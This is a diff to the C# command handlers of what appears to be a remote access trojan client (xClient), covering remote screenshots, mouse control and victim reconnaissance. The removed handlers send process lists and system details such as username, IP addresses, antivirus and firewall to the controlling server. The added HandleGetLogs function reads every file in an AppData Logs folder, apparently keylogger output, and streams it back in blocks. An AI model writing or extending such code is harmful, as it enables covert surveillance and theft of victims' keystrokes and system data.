@@ -1,9 +1,10 @@
-﻿using System.Diagnostics;
+﻿using System;
 using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
 using xClient.Core.Helper;
 using System.Drawing.Imaging;
+using System.Threading;
 
 namespace xClient.Core.Commands
 {
@@ -45,25 +46,6 @@ namespace xClient.Core.Commands
             LastDesktopScreenshot.Dispose();
         }
 
-        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
-        {
-            Process[] pList = Process.GetProcesses();
-            string[] processes = new string[pList.Length];
-            int[] ids = new int[pList.Length];
-            string[] titles = new string[pList.Length];
-
-            int i = 0;
-            foreach (Process p in pList)
-            {
-                processes[i] = p.ProcessName + ".exe";
-                ids[i] = p.Id;
-                titles[i] = p.MainWindowTitle;
-                i++;
-            }
-
-            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
-        }
-
         public static void HandleMouseClick(Packets.ServerPackets.MouseClick command, Client client)
         {
             Screen[] allScreens = Screen.AllScreens;
@@ -95,46 +77,61 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
-        {
-            try
-            {
-                string[] infoCollection = new string[]
-                {
-                    "Processor (CPU)",
-                    SystemCore.GetCpu(),
-                    "Memory (RAM)",
-                    string.Format("{0} MB", SystemCore.GetRam()),
-                    "Video Card (GPU)",
-                    SystemCore.GetGpu(),
-                    "Username",
-                    SystemCore.GetUsername(),
-                    "PC Name",
-                    SystemCore.GetPcName(),
-                    "Uptime",
-                    SystemCore.GetUptime(),
-                    "MAC Address",
-                    SystemCore.GetMacAddress(),
-                    "LAN IP Address",
-                    SystemCore.GetLanIp(),
-                    "WAN IP Address",
-                    SystemCore.WanIp,
-                    "Antivirus",
-                    SystemCore.GetAntivirus(),
-                    "Firewall",
-                    SystemCore.GetFirewall()
-                };
-
-                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
-            }
-            catch
-            {
-            }
-        }
-
         public static void HandleMonitors(Packets.ServerPackets.Monitors command, Client client)
         {
             new Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
+        }
+
+        public static void HandleGetLogs(Packets.ServerPackets.GetLogs command, Client client)
+        {
+            new Thread(() =>
+            {
+                try
+                {
+                    int index = 1;
+                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
+
+                    if (!Directory.Exists(path))
+                    {
+                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
+                        return;
+                    }
+
+                    FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();
+
+                    if (iFiles.Length == 0)
+                    {
+                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
+                        return;
+                    }
+
+                    foreach (FileInfo file in iFiles)
+                    {
+                        FileSplit srcFile = new FileSplit(file.FullName);
+
+                        if (srcFile.MaxBlocks < 0)
+                            new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
+
+                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                        {
+                            byte[] block;
+                            if (srcFile.ReadBlock(currentBlock, out block))
+                            {
+                                new Packets.ClientPackets.GetLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
+                                //Thread.Sleep(200);
+                            }
+                            else
+                                new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
+                        }
+
+                        index++;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
+                }
+            }).Start();
         }
     }
 }
